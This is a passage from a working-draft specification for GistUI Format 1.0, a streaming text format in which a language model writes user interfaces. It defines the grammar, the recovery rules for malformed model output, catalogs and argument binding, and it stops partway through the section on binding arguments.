# GistUI Format 1.0

**Working Draft, 2 October 2026**

| | |
|---|---|
| This version | `spec/gistui-format.md` in the GistUI repository |
| Replaces | GistUI Lang, draft 0.1 (`spec/gistui-lang.md`) |
| Media type | `text/vnd.gistui` (not registered, see §26.5) |
| File extension | `.gistui` |
| Conformance suite | `spec/conformance/` |
| Machine-readable schemas | `spec/schemas/` |
| Transport bindings | `spec/bindings/` (non-normative drafts) |

## Status of this document

This is a Working Draft. It can change in incompatible ways until it is published as 1.0.
It was written from the reference implementation (`packages/core`). Where the two differ, the
difference is deliberate and is listed in Appendix D. Appendix D is informative and will be removed
when the implementation and this document agree.

## Abstract

GistUI Format is a text format for user interfaces that a language model writes and a program
renders while the text is still arriving. A document is a list of short statements. Each statement
names a component, a data table, a state variable or an expression. A *catalog* says which
components exist and what arguments they take. A *processor* turns the text and a catalog into a
tree of nodes and a list of diagnostics. A *runtime* evaluates expressions, holds state and calls
tools. A *renderer* draws the tree.

GistUI Format is a content format, like HTML or Markdown. It is not a wire protocol. How a document
travels (an HTTP stream, an MCP tool result, an AG-UI event) is described in separate binding
documents.

## Contents

1. Introduction
2. Conventions and terminology
3. Conformance
4. Text, lines and modes
5. Lexical structure
6. Grammar
7. Recovery rules
8. Syntax errors
9. Catalogs
10. Statements and values
11. Components and arguments
12. Tables
13. The abstract tree
14. Edits
15. End of stream
16. Streaming
17. Validity
18. Runtime: state and expressions
19. Tools: queries and mutations
20. Actions
21. Resource limits
22. Diagnostics
23. Security considerations
24. Accessibility
25. Internationalisation
26. Versioning and extensibility

Appendix A. Collected grammar · Appendix B. Canonical text form · Appendix C. Changes from
draft 0.1 · Appendix D. Reference implementation notes · References

---

## 1. Introduction

### 1.1 Scope

This document defines:

- the syntax of a GistUI program, as a strict grammar that generators write (§4 to §6);
- the recovery rules a processor applies to input that is not strict, and the diagnostic each rule
  reports (§7, §8);
- how statements become a tree of nodes, given a catalog (§9 to §15);
- what a processor may show while input is still arriving (§16);
- the meaning of state, expressions, built-in functions, queries, mutations and actions (§18 to §20);
- resource limits (§21), diagnostics (§22), and requirements for security, accessibility and
  internationalisation (§23 to §25);
- versioning and extension points (§26).

### 1.2 Out of scope

- Transport. See `spec/bindings/`.
- The visual design of components. A catalog names components and their arguments. How a component
  looks is the renderer's business.
- Any particular catalog. The default GistUI catalog (`@gistui/catalog`) is one catalog among many.
- How a host builds a model prompt from a catalog. §26.4 defines the data a host can give a
  generator. The prompt text is not specified.

### 1.3 Design notes (informative)

- A program is line-based and flat. A model can write the outer layout first and fill in parts
  later, and a renderer can show each statement as it completes.
- Parsing is directed by the catalog. A bare word is an enum value, a flag or a reference depending
  on the component it is written in. It never depends on text that arrives later.
- The program is untrusted. It is model output and may be steered by content the model read. Every
  rule that has a security consequence is restated in §23.
- Models make small, repeated syntax mistakes. The format defines exactly how each one is repaired,
  so two processors give the same tree for the same imperfect text.

## 2. Conventions and terminology

The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT", "SHOULD", "SHOULD NOT",
"RECOMMENDED", "NOT RECOMMENDED", "MAY", and "OPTIONAL" in this document are to be interpreted as
described in BCP 14 [RFC2119] [RFC8174] when, and only when, they appear in all capitals, as shown
here.

Grammar is written in the EBNF of ISO/IEC 14977 in simplified form: `{ x }` is zero or more,
`[ x ]` is optional, `|` is choice, quoted text is literal. Character classes are written as in
regular expressions.

Sections, notes and examples marked "informative" are not requirements. Everything else is
normative.

Terms:

- **Program**: the text of one GistUI document, after fences and chat text are removed (§4.3).
- **Statement**: one definition, declaration or edit (§6).
- **Statement id**: the name on the left of a statement.
- **Catalog**: the set of components a program may use, with their arguments (§9).
- **Generator**: whatever writes a program. Usually a language model, sometimes a tool.
- **Processor**: a parser and materializer. Input: program text and a catalog. Output: an abstract
  tree and a list of diagnostics.
- **Runtime**: the part that holds state, evaluates expressions, calls tools and runs actions.
- **Renderer**: the part that draws nodes and reports user interaction.
- **Host**: the application that embeds a processor, runtime and renderer. The host supplies the
  catalog, the tools and the policies, and receives action envelopes (§20.3).
- **Node**: one element of the abstract tree (§13).
- **Diagnostic**: a report about the program, with a stable code (§22).
- **Strict text**: text that matches the grammar of §6 with no recovery rule applied.
- **Bare word**: a name or word written without quotes in a value position.
- **Open statement**: while streaming, the last statement, whose end has not arrived.
- **End of stream**: the point at which the processor is told that no more text will come.

## 3. Conformance

### 3.1 Conformance classes

**Generator.** A generator conforms when, for the catalog and capabilities it was given (§26.4),
every program it writes is *clean*: a conforming processor reports no diagnostic for it (§17).
A generator MUST write strict text. It MUST NOT rely on a recovery rule.

**Processor.** A processor conforms when it meets every requirement of §4 to §17 and §21 to §22
that applies to processors. In particular it:

- MUST accept every strict program;
- MUST apply the recovery rules of §7 to text that is not strict, and MUST report each application
  with the diagnostic the rule names;
- MUST produce, for any input and catalog, the tree and the list of diagnostics this document
  defines, and no others;
- MUST produce the same final result however the input is divided into chunks (§16);
- MUST NOT fail, throw to its caller, or run without bound on any input (§21).

**Runtime.** A runtime conforms when it meets the requirements of §18 to §21 for the profiles it
claims.

**Renderer.** A renderer conforms when it draws the abstract tree as §13 describes, applies the
policies of §23, meets §24, and reports interaction with the envelope of §20.3. This document does
not define pixels.

**Catalog.** A catalog document conforms when it is valid against
`schemas/catalog.schema.json` and meets the constraints of §9.3.

### 3.2 Profiles

A profile is a set of features. Profiles are cumulative.

| Profile | Adds | Required sections |
|---|---|---|
| **Core** | Statements, components, tables, references, edits, diagnostics, streaming. The tree is static. | §4 to §17, §21 (static limits), §22, §23, §26 |
| **Interactive** | State, expressions, built-in functions, `@each`, actions, bindings. | Core, and §18, §20, §21 (runtime limits), §24, §25 |
| **Tools** | `@query`, `@mutation`, `@run`. | Interactive, and §19 |

A Core processor MUST still parse the whole grammar, including expressions. It keeps a runtime
expression as an expression (§10.2) and does not evaluate it. A renderer that implements only Core
MUST draw nothing for an `#expr` node and MUST ignore `dyn` entries.

A runtime that implements Interactive but not Tools MUST evaluate a statement whose value is
`@query(…)` to that query's `default` value, MUST NOT call any tool, and MUST treat `@run` as an
unknown step (§20.2).

### 3.3 Claiming conformance

A claim names the class, the version and the profile, for example "GistUI Format 1.0 processor,
Core profile". A processor claim requires passing every case of the conformance suite for its
profile, both in one piece and one character at a time (`spec/conformance/README.md`).

## 4. Text, lines and modes

### 4.1 Encoding

A program is a sequence of Unicode characters. For interchange it MUST be encoded as UTF-8
[RFC3629]. A processor that accepts bytes MUST decode them as UTF-8 and MUST replace an ill-formed
sequence with U+FFFD. A multi-byte character, or a UTF-16 surrogate pair in an implementation that
uses UTF-16 strings, can be split across chunks. The processor MUST join it before use.

If the first character of the input is U+FEFF (byte order mark), the processor MUST skip it. A
generator SHOULD NOT write one.

### 4.2 Lines

A line ends at U+000A (LF). Lines are numbered from 1. U+000D (CR) is whitespace and is not a line
terminator: `CR LF` therefore ends a line, and a CR alone does not. No other character ends a line.

### 4.3 Modes

A processor works in one of two modes. The host chooses the mode.

- **Document mode.** The whole input is a program.
- **Inline mode.** The input is chat text in Markdown. Only the lines inside *program blocks*
  (§4.5) are a program. Every other line is *chat text*: the processor MUST pass it to the host
  unchanged, in order, with its line number, and MUST NOT report a diagnostic for it.

### 4.4 Line classification

When no statement is open, the processor classifies the next line. It skips leading spaces, tabs
and CR. Then, by the first remaining character:

| # | First character | Class |
|---|---|---|
| 1 | none (the line is blank) | blank: ignored |
| 2 | `` ` `` or `~` | a *fence line* if it matches §4.5, otherwise prose |
| 3 | any, in inline mode outside a program block | chat text |
| 4 | `#` | comment (§4.6): ignored |
| 5 | `$`, an ASCII letter or `_` | a statement if the line starts with a *statement head*, otherwise prose |
| 6 | anything else | prose |

Rules are tried in this order. A *statement head* is:

```
head     = target ws ( "=" | "+=" ) ;
target   = "$" ID | name [ "." name ] ;
name     = ( letter | "_" ) { letter | digit | "_" } ;
ws       = { " " | TAB | CR } ;
```

and the character after the `=` MUST NOT be `=` (so `a == b` is prose, not a statement). ID is
defined in §5.2.

**Prose** is a line that is not part of the program. In document mode the processor MUST ignore the
line and report `prose-ignored` (warning) with its line number. In inline mode, prose inside a
program block MUST be reported the same way, and MUST also be passed to the host as chat text.

A line that starts with `|` when no table is open is prose.

### 4.5 Fences

A **fence line** is, after optional leading whitespace, three or more backticks or three or more
tildes, followed by an *info string* (the rest of the line, trimmed).

```
fence    = ( "```" { "`" } | "~~~" { "~" } ) info ;
```

**Document mode.** Every fence line is dropped, whatever its info string. No diagnostic is
reported. A generator in document mode SHOULD NOT write fences.

**Inline mode.** Fences follow CommonMark [COMMONMARK]:

1. Outside a block, a fence line opens a block. A backtick fence whose info string contains a
   backtick is not a fence line; it is chat text.
2. The block is a **program block** if its info string is empty, or if its first word is `gistui`
   or `gist` in any letter case (the tag is followed by the end of the info string or by a
   character that is not a letter, digit or `_`). Any other block is a **text block**.
3. A block is closed by a fence line that uses the same character, is at least as long as the
   opening fence, and has an empty info string. Any other fence line inside a block is ordinary
   content of that block: chat text in a text block, prose (§4.4) in a program block.
4. The opening and closing fence lines of a program block are dropped. Lines inside it are
   classified by §4.4.
5. A text block is chat text in full: its fence lines and everything inside it, including anything
   that looks like a nested `gistui` block.
6. A program block that is still open at end of stream is closed there. No diagnostic is reported.
7. A document can hold several program blocks. Together they form one program, in order.

A fence line is recognised only where a line is classified (§4.4), with one exception. If a
statement is open inside brackets and the next line is a fence line that would close the current
program block (inline mode) or is any fence line (document mode), the open statement ends as if the
stream had ended there (rule R2, §7), and the fence line is then handled as above.

### 4.6 Comments and the version pragma

A line whose first character (after whitespace) is `#` is a comment.

Inside an expression statement, outside a string, `#` starts a comment that runs to the end of the
line. The line terminator is not part of the comment. `#` has no special meaning inside a table
(§12).

If the first line of a program is `#gistui` followed by a space and a version number, it is the
**version pragma** (§26.2). It is otherwise an ordinary comment.

### 4.7 The extent of a statement

After the head, the processor skips whitespace and line terminators. The body can therefore start
on a later line. Then:

- If the first body character is `|` and the head is `name =`, the statement is a **table
  statement**. It runs to the end of the line, and continues with every following line whose first
  character after whitespace is `|`. Blank lines between rows are skipped. The first other line
  ends the table and is classified by §4.4.
- Otherwise the statement is an **expression statement**. It ends at the first line terminator that
  is outside a string and outside all brackets. Inside `( )`, `[ ]` or `{ }` a line terminator is
  whitespace.

An expression statement also ends early in the cases of rules R1, R2 and R3 (§7).

To find the end of a statement a processor only needs to track strings, comments and bracket depth.
A closing bracket lowers the depth by one whatever its kind.

## 5. Lexical structure

This section applies to expression statements. Tables have their own rules (§12).

### 5.1 Whitespace

Space, tab and CR separate tokens and are otherwise ignored. Inside brackets, LF is whitespace too.

### 5.2 Names

```
letter   = "A".."Z" | "a".."z" ;
digit    = "0".."9" ;
namechar = letter | digit | "_" ;
ID       = ( "a".."z" | "_" ) { namechar } ;
COMP     = "A".."Z" { namechar } ;
NAME     = ID | COMP ;
STATE    = "$" ID ;
BUILTIN  = "@" NAME ;
```

Names are ASCII only. A name ends at the first character that is not a `namechar`.

- `ID` is a statement id, a prop name, a lambda parameter or a bare word.
- `COMP` followed by `(` is a component call. A `COMP` that is not followed by `(` is a bare word
  (§11.2).
- `STATE` names a state variable (§18.2).
- `BUILTIN` names a built-in function or an action step. Built-in names are compared without
  regard to letter case: `@Sum` is `@sum`.

Statement ids and state names are case-sensitive.

### 5.3 Strings

```
STRING   = '"' { char | escape } '"' ;
char     = any character except '"', "\", and U+0000..U+001F ;
escape   = "\" ( '"' | "\" | "/" | "b" | "f" | "n" | "r" | "t" | "u" hex hex hex hex ) ;
hex      = digit | "a".."f" | "A".."F" ;
```

A strict string is a JSON string [RFC8259]. Its value is the sequence of characters after escapes
are replaced: `\n` is LF, `\t` is tab, `\r` is CR, `\b` is U+0008, `\f` is U+000C, and `\uXXXX` is
the UTF-16 code unit with that value (two of them form a surrogate pair). A string cannot hold a
raw line terminator. Strings do not interpolate: join text with `+` or `@fmt` (§18).

Rules R3, R10, R14 and R15 (§7) say what a processor does with strings that are not strict.

### 5.4 Numbers

```
NUMBER   = int [ "." digit { digit } ] [ ( "e" | "E" ) [ "+" | "-" ] digit { digit } ] ;
int      = "0" | ( "1".."9" { digit } ) ;
```

A number is a JSON number without a sign. Its value is the nearest IEEE 754 binary64 value. A `-`
directly before a number literal is the unary minus operator; the processor folds it into a
negative literal (§6.2). `1.` is not a number: it is `1` followed by `.`.

Rules R7, R8 and R9 cover `+5`, `.5` and `01`.

### 5.5 Words

```
WORD     = digit { digit } ( letter | "_" ) { namechar } ;
```

A word is a digit-led bare word such as `2xl` or `3d`. Its value is its own text, as a string. It
exists so that enum values that start with a digit can be written bare.

A processor decides between `NUMBER` and `WORD` like this. At a digit, let *N* be the longest
match of the `NUMBER` pattern (allowing leading zeros) and *W* the longest run of `namechar`. If
the character after *N* is not a `namechar`, the token is the number *N*. Otherwise the token is
the word *W*.

### 5.6 Punctuation

```
( ) [ ] { } , : = . ? + - * / % < > !
== != <= >= && || =>
```

Two-character operators are matched first. `+=` is an operator only in a statement head.

### 5.7 Keywords

`true`, `false` and `null` are keywords. They are case-sensitive: `True` is a bare word.

## 6. Grammar

### 6.1 Statements

```
program    = { line } ;
line       = statement | comment | fence | blank ;

statement  = assign | table | state | patch | append ;
assign     = ID "=" expr ;                    (* define or redefine; "= null" deletes, §14 *)
table      = ID "=" row { LF row } ;          (* §12 *)
state      = "$" ID "=" expr ;                (* declare a state variable, §18.2 *)
patch      = ID "." NAME "=" expr ;           (* set one prop of a component statement, §14 *)
append     = ID "+=" expr ;                   (* add a child or a list item, §14 *)
```

A program SHOULD define a statement named `root`. It is the root of the tree (§15).

Statement order is free. A statement can refer to one that is defined later (§10.3). A generator
SHOULD write `root` first, then containers, then leaves, then data tables, so that a renderer can
show the layout early.

### 6.2 Expressions

```
expr       = lambda | cond ;
lambda     = ( ID | "(" [ ID { "," ID } ] ")" ) "=>" expr ;
cond       = or [ "?" expr ":" expr ] ;
or         = and { "||" and } ;
and        = eq { "&&" eq } ;
eq         = rel { ( "==" | "!=" ) rel } ;
rel        = add { ( "<" | ">" | "<=" | ">=" ) add } ;
add        = mul { ( "+" | "-" ) mul } ;
mul        = unary { ( "*" | "/" | "%" ) unary } ;
unary      = ( "!" | "-" ) unary | postfix ;
postfix    = primary { "." NAME | "[" expr "]" } ;
primary    = call | builtin | list | object | "(" expr ")"
           | STRING | NUMBER | WORD | "true" | "false" | "null"
           | STATE | ID | COMP ;

call       = COMP "(" [ args ] ")" ;
builtin    = BUILTIN "(" [ args ] ")" ;
args       = arg { "," arg } [ "," ] ;
arg        = ID ( ":" | "=" ) expr            (* named argument *)
           | expr ;                           (* positional argument *)
list       = "[" [ expr { "," expr } [ "," ] ] "]" ;
object     = "{" [ entry { "," entry } [ "," ] ] "}" ;
entry      = key ":" expr
           | ID ;                             (* shorthand: {wrap} is {wrap:true} *)
key        = NAME | STRING ;
```

Notes:

- Binary operators of one level associate to the left. The conditional operator associates to the
  right. Precedence, lowest first: `? :`, `||`, `&&`, `== !=`, `< > <= >=`, `+ -`, `* / %`, unary
  `! -`, postfix `.` and `[ ]`.
- An argument is named when its first two tokens are `ID :` or `ID =`. A generator SHOULD write
  `:`. Named arguments can appear anywhere in the list. When a prop is named twice, the last one
  wins.
- `-` applied to a number literal gives a negative number literal. `- -2` is `2`.
- A parenthesised list of identifiers is a lambda parameter list only when `=>` follows the `)`.
- There is no general function call. `(` after an expression that is not a `COMP` or a `BUILTIN`
  is a syntax error, except under rule R6.
- A `BUILTIN` MUST be followed by `(`.

## 7. Recovery rules

Models write small mistakes. A processor MUST apply the rules below, and only these. Each rule
gives the exact condition, what the processor does, and the diagnostic it MUST report, once for
each place the rule is applied. Unless a rule says otherwise, the diagnostic is `lenient-syntax`
(warning, `fixed`), it carries the id of the statement and the line of the place.

A generator MUST NOT write text that needs a rule.

**R1. A call left open when the next statement begins.** *Condition:* a line terminator arrives
while brackets are open; the last character of the statement that is not whitespace is `)`, `]`,
`}`, a closing quote or a `namechar`; and the next line that is not blank starts in column 1 (no
leading whitespace) with a statement head (§4.4) whose `=` is not followed by `=` or `>`.
*Action:* the open brackets are closed, innermost first, where the line ended. The statement ends
there. The next line starts a new statement. *Diagnostic:* `lenient-syntax` with the first line of
the statement that was closed, and no statement id.

If the stream ends while the processor is still reading the candidate line, the line belongs to the
open statement.

**R2. Brackets open at end of stream.** *Condition:* the stream ends (or a fence closes the block,
§4.5) inside an expression statement with open brackets and no open string. *Action:* the brackets
are closed, innermost first. *Diagnostic:* as R1.

**R3. A string that is not closed.** *Condition:* a line terminator, or the end of the stream,
arrives inside a string. *Action:* the string is closed at that point. A CR directly before the
line terminator and a single `\` directly before the line terminator (or the end) are not part of
the string. All open brackets are closed, and the statement ends. *Diagnostic:*
`unterminated-string` (error, `fixed`) with the line on which the string was left open, and no
statement id. R2 is not reported as well.

**R4. Empty argument.** *Condition:* inside the arguments of a call, a `,` appears where an
argument is expected (`Stat("a", , "c")`, `Row(, x)`). *Action:* the empty place is a positional
argument with the value `null`. It counts as an argument for positions and node ids (§13.3). A
single trailing comma before `)` is not an empty argument.

**R5. JSON-style named argument.** *Condition:* at the start of an argument, a complete `STRING`
whose value matches `NAME` is directly followed by `:`. *Action:* it is a named argument with that
name.

**R6. Component name in lower case.** *Condition:* an `ID` is directly followed by `(`, and the
`ID` equals a catalog component name when letter case is ignored. *Action:* it is a call of that
component.

**R7. Plus sign before a number.** *Condition:* where a `unary` can start, `+` is followed by a
`NUMBER`. *Action:* the `+` is ignored.

**R8. Number without a leading zero.** *Condition:* `.` is directly followed by a digit, at a place
where a value can start (see R10). *Action:* the token is a number with a `0` before the `.`.

**R9. Leading zeros.** *Condition:* a number starts with `0` followed by a digit. *Action:* it is
read in base ten (`007` is 7).

**R10. Single-quoted string.** *Condition:* `'` appears where a value can start: at the start of
the body, or after `(`, `,`, `[`, `{`, `:`, `=`, or after an operator (`+ - * / % ? ! == != < > <=
>= && || =>`). *Action:* a string that ends at the next `'` that is not escaped. Escapes are those
of §5.3, plus `\'`. Anywhere else, `'` is an unexpected character (§8.1).

**R11. Semicolon.** *Condition:* `;` outside a string. *Action:* ignored.

**R12. Missing comma.** *Condition:* between two arguments of a call, two items of a list, or two
entries of an object, the first is complete and the next token is not `,` and not the closing
bracket. *Action:* the next token starts the next argument, item or entry.

**R13. `//` comment.** *Condition:* `//` outside a string, inside an expression statement.
*Action:* a comment to the end of the line, as `#`. (A line that *starts* with `//` is prose,
§4.4.)

**R14. Unknown escape.** *Condition:* in a string, `\` is followed by a character that §5.3 does
not list, or `\u` is not followed by four hexadecimal digits. *Action:* for `\c`, the result is the
character `c`. For a bad `\u`, the `\u` is dropped and the characters after it are ordinary
content.

**R15. Raw control character in a string.** *Condition:* a character in U+0000..U+001F other than
LF appears in a string. *Action:* it is kept as it is.

**R16. Capitalised statement id.** *Condition:* the name in a statement head, or the target of a
patch or append, starts with an upper-case letter (`SummaryCard = Card(…)`). *Action:* it is a
statement id as written.

**R17. Capitalised argument name.** *Condition:* at the start of an argument, a `COMP` is directly
followed by `:`. *Action:* it is a named argument (`Gap:lg`). Prop names are matched without regard
to case (§11.3).

**R18. List without brackets.** *Condition:* after the complete value of a statement, a `,` is
followed by another value (`cols = Col("a"), Col("b")`). *Action:* the values form a list.

**R19. Trailing comma after a statement.** *Condition:* after the complete value of a statement, a
`,` is followed by nothing. *Action:* the `,` is ignored. The value is not turned into a list.

**R20. Extra closing bracket.** *Condition:* after the complete value of a statement, the next
token is `)`, `]` or `}`. *Action:* that token and everything after it are ignored.

**R21. Ellipsis.** *Condition:* `…` (U+2026) or `...` outside a string. *Action:* ignored.

**R22. Table rows inside a call.** *Condition:* in an expression statement that is not a table
statement, inside brackets, a line starts (after whitespace) with a single `|`, or a `(` is
followed on the same line, outside a string, by a single `|`. `||` is the operator, not a row.
*Action:* each run of such lines is a table (§12). The processor defines it as a table statement
named *id*`_t`*n*, where *id* is the id of the enclosing statement and *n* counts from 1, directly
before the enclosing statement, and replaces the rows by a reference to it. A row ends where the
call resumes: at a `)` that has no matching `(` in the row, or at a `,` that is at the end of the
line, is followed by `name:` or `name=`, or directly follows a `|`. The rule is applied when the
statement completes, not while it is open.

**R23. `=` in an object entry.** *Condition:* in an object, a key is followed by `=`. *Action:* as
`:`.

## 8. Syntax errors

### 8.1 Errors that keep the statement

After the recovery rules, two kinds of error are repaired in place. The statement is kept, and the
processor MUST report `parse-failed` (error, `fixed`) with the statement id and the line of the
place:

1. **Unexpected character.** A character outside a string that cannot start a token: for example
   `` ` ``, `~`, `^`, `\`, a lone `&` or `|`, a `$` or `@` with no name after it, a `'` that is not
   covered by R10, or a letter that is not ASCII. The character is skipped. One diagnostic is
   reported for each such character.
2. **Text after the value.** Tokens remain after the complete value of the statement and the first
   of them is not `,` (R18, R19) and not a closing bracket (R20). The remaining tokens are ignored.
   One diagnostic is reported.

### 8.2 Errors that drop the statement

Any other text that does not match the grammar is fatal for its statement: for example a missing
value (`a =`), an operator with no right side, `{1: 2}`, `Row(gap:)`, `[1, , 2]`, `@name` without
`(`, or a closing bracket of the wrong kind.

The processor MUST then:

- report exactly one `parse-failed` (error, not `fixed`) with the line of the place, and no
  statement id;
- report no other diagnostic for that statement;
- define nothing. If the statement would have redefined an existing statement, the existing
  definition stays (§14).

A syntax error never affects another statement.

## 9. Catalogs

A processor needs a catalog to read a program: the catalog decides what a bare word means and how
arguments map to props.

### 9.1 Model

A catalog has:

- **components**: a list. Each component has
  - `name`: a `COMP` name, unique in the catalog. No two names may differ only in letter case;
  - `props`: a map from prop name (an `ID`) to a prop definition (§9.2);
  - `args`: an ordered list of prop names that are filled by position. A name written `name?` is an
    optional positional;
  - `children`: `true` if the component takes child components after its positionals, or
    `{ "of": [names] }` to accept only the named components or unions;
  - `aliases`: a map from an alternative prop name to a prop name;
  - `table`: a table mapping (§11.9);
  - `description` and `group`: text for people and prompts. They do not affect processing.
- **unions**: a map from a union name to a list of component names or union names.
- **textComponent** (default `Text`) and **textProp** (default `content`): the component and prop
  that hold a string written in child position (§11.5).

### 9.2 Prop types

A prop definition has a `type`, and optionally `required` (boolean), `default` (a value of the
type) and `description`.

| `type` | Value | Extra fields |
|---|---|---|
| `string` | text | `format: "url"` marks a URL that loads without a click (§23.4) |
| `number` | a number | |
| `boolean` | `true` or `false`. A boolean prop is also a *flag* (§9.4) | |
| `enum` | one of `values` | `values` (list of strings), `aliases` (map from another spelling to a value), `open` (any other string is accepted too), `examples` (prompt only) |
| `node` | one component | `of` (allowed component or union names; informative in 1.0) |
| `nodes` | a list of components | `of` |
| `data` | a table (§12) or a list | |
| `array` | a list | `items` (a prop type for the items) |
| `object` | a map from keys to values | |
| `action` | a list of action steps (§20) | |
| `state` | a state variable to bind to (§18.2) | |
| `any` | any value | |

### 9.3 Constraints

A conforming catalog MUST satisfy:

1. Every name in `args` (without its `?`) is a key of `props`.
2. In `args`, no required positional follows an optional one.
3. A component with `children` has no optional positional.
4. Every alias target is a key of `props`.
5. `textComponent` names a component, and `textProp` is a `string` prop of it.
6. Union references do not nest deeper than 8 levels.

A processor MUST reject a catalog that breaks rules 1 to 3. It SHOULD reject one that breaks 4
to 6.

### 9.4 Derived sets

From a catalog a processor derives, for each component C:

- **flags**: the names of C's `boolean` props.
- **enum words**: the values of C's closed (`open` not set) enum props that belong to exactly one
  of those props and are not flag names. Each enum word maps to its prop.
- **prop lookup**: a map from lower-cased name to prop name. It holds every prop name and every
  alias. An alias wins over a prop name with the same lower-cased spelling.
- **child types**: if `children.of` is set, the set of component names it expands to through the
  unions. Otherwise any component is accepted.

and for the catalog:

- **reserved words**: every flag name of every component. A statement SHOULD NOT use one as its id
  (§11.2).

### 9.5 The closest-name rule

The **distance** between two names is the optimal string alignment distance: the smallest number of
single-character insertions, deletions, substitutions, and swaps of two adjacent characters, that
turns one into the other, where no part is edited twice. It is computed on the lower-cased names.
`Crad` and `Card` are at distance 1.

The **closest component** to a name *n* that is not in the catalog is:

1. the component whose name equals *n* when letter case is ignored, if there is one;
2. otherwise the component at the smallest distance from *n*, if that distance is at most 2 when
   *n* has six or more characters, or at most 1 when it has fewer. On a tie the component that
   comes first in the catalog wins;
3. otherwise none.

Enum values use the same distance with a fixed limit of 2 (§11.4).

### 9.6 Manifest

A catalog is exchanged as a JSON document, the **catalog manifest**, defined by
`schemas/catalog.schema.json`. Besides the model above it carries `gistui` (the format version it
targets), `id` and `version` (§26.6), and optional prompt material: `title`, `description`,
`guide`, `examples` and `notes`. A processor uses only the fields of §9.1 and MUST ignore fields it
does not know.

## 10. Statements and values

### 10.1 Kinds of statement

| Written | Kind | Result |
|---|---|---|
| `id = Name(…)` | **component** | a node with the id `id` (§13) |
| `id = \|…` | **data** | a table value (§12) |
| `id = expr`, static | **data** | a value: text, number, boolean, list, object |
| `id = expr`, runtime | **runtime** | an `#expr` node with the id `id`, evaluated by a runtime |
| `$id = expr` | **state** | a state variable with a default (§18.2) |
| `id = null` | delete | §14 |
| `id.prop = expr`, `id += expr` | edit | §14 |

### 10.2 Static and runtime expressions

An expression is **static** when it is a string, a number, a word, a keyword, a bare word, a
component call, or a list or object whose parts are all static. Every other expression is a
**runtime expression**: a state variable, a built-in call, an operator, a conditional, a member or
index access, a lambda, or a list or object that contains one of these.

A static statement that refers to a runtime statement, directly or through other data statements,
is a runtime statement too.

A processor never evaluates a runtime expression. It keeps the expression:

- A runtime statement becomes a node of type `#expr` whose `dyn.value` is the expression.
- A prop whose value is a runtime expression, contains one, or refers to a runtime statement is
  recorded in the node's `dyn` map under the prop name, and is absent from `props`.
- A runtime expression in child position becomes an `#expr` node (§11.5).

The arguments of a component call inside a runtime expression (`@each(rows, r => Card(r.name))`)
are bound by the runtime, with the same rules as §11 (§18.8).

### 10.3 References

A bare word that is not an enum value or a flag (§11.2) is a **reference** to the statement with
that id.

- A reference can come before the definition. Order does not matter for the final tree.
- A reference to a **component** or **runtime** statement stands for that node. The node is not
  copied: two references give two places in the tree that show the same node (§13.4).
- A reference to a **data** statement stands for its value. In a prop the value is used as written.
  In child position it is spread (§11.5).
- A data statement that refers to itself, directly or through other data statements, has no finite
  value. In a data statement S, a reference to a data statement T is dropped when T is S, or when
  T refers back to S directly or through other data statements (a dropped reference still counts
  as referring). `cycle` (error, `fixed`, `ref` = T) is reported on S. In `a = [b]`, `b = [a]`
  both references are dropped and both statements are reported.
- A reference to an id that nothing defines by the end of the stream is handled by §15.
- State variables are not statements in this sense. `$x` is read with `$x`, never with `x`.

## 11. Components and arguments

```
Name(positionals…, children…, key:value…)
```

### 11.1 Finding the component

For a call `Name(…)`:

1. If the catalog has `Name`, it is used.
2. Otherwise, if the closest-name rule (§9.5) gives a component, that component is used, and
   `unknown-component` (error, `fixed`, `use` = the name used) is reported.
3. Otherwise the node has the type `#unknown` (§11.7) and `unknown-component` (error, not `fixed`)
   is reported.

### 11.2 Bare words

A bare word is an `ID`, a `COMP` not followed by `(`, or a `WORD`. Words joined by hyphens count as
one word in the cases below: `map-pin` is read as the operator expression `map - pin`, and a chain
of `-` whose operands are bare words, words and non-negative integer literals is turned back into
the single word `map-pin` (spaces around the hyphens do not matter).

The following rules are tried in order. Rules 1 to 3 depend only on the catalog and the position.
Rules 4 to 7 also depend on which statements the complete program defines.

1. **Named enum.** In `key:word`, if `key` is an enum prop of the component, `word` (hyphens
   joined) is an enum value. This holds even if a statement is named `word`.
2. **Flag.** A positional bare word that is a flag of the component sets that prop to `true`. This
   holds even if a statement has that name. For that reason every statement whose id is a reserved
   word (§9.4) gets `reserved-id` (warning), whether or not it is used as a flag.
3. **Hyphenated positional.** A positional hyphen-joined word that is an enum word of the component
   sets that enum prop. Otherwise, if the positional prop at that position is an enum prop, the
   word is its value. Otherwise the text is a subtraction.
4. **Table.** If the component has a table mapping and the word names a table statement, the
   mapping applies (§11.9).
5. **Enum word.** If no statement has that name, the word is an enum word of the component, and
   that prop is not set yet, the word sets that prop.
6. **Positional enum.** If no statement has that name, and the next free positional prop (§11.3) is
   an enum prop that is open or lists the word, the word is its value.
7. **Reference.** Otherwise the word is a reference (§10.3).

A patch `id.prop = word` uses rule 1 with the component of `id`.

In rules 5 and 6, an id that was deleted (§14) counts as a statement.

While streaming, rules 5 and 6 are provisional: if a statement with that name arrives later, rule 7
applies and the component is rebuilt.

### 11.3 Binding arguments

Let C be the component, and let the *argument list* be the arguments of the call, followed, for a
component statement, by the values appended to it (§14), as positional arguments.

A positional prop is **free** when no earlier argument used it, it has no value yet and it is not
*given*. A prop is **given** when
the call names it (after prop lookup), sets it as a flag, or sets it by rule 5 of §11.2. Given
props keep their place: `Callout(variant:info, "Title", "Text")` and
`Callout("Title", "Text", info)` bind the same props.

For each argument, in order, with its index *i* counted from 0 over all arguments:

1. **Named** `key: v`. Look `key` up: an exact prop name first, then the prop lookup of §9.4
   without regard to case. If it is a prop, set it (below). If it is not:
   - `children`, on a component with children: `v` is added as children at this place (§11.5);
   - `style`: see §11.6;
   - anything else: `unknown-prop` (warning, `arg` = the key). The argument is ignored.
2. **Flag** (rule 2): the prop is `true`.
3. **Bare word** under rule 4 or 5: as those rules say.
4. **Any other value** `v`. Let S be the first free positional prop.
   1. If rule 6 applies, S is the word.
   2. Else if S exists: S is set from `v`, except that when `v` is `null` and S is not `required`,
      S is left unset. Either way the argument uses S: S is not free for later arguments.
   3. Else if C takes children: `v` is added as children (§11.5).
   4. Else if C has a prop that is not positional, not given, not set and not `style`: the first
      such prop in declaration order is set from `v` (a `null` skips it), and
      `positional-optional` (warning) is reported.
   5. Else `excess-args` (error, `fixed`, `arg` = *i*) is reported and the argument is ignored.

Then the patches of the statement are applied in order, each as a named argument (§14).

**Setting a prop** from an expression `v`:

- If `v` is a runtime expression (§10.2), the prop goes to `dyn`.
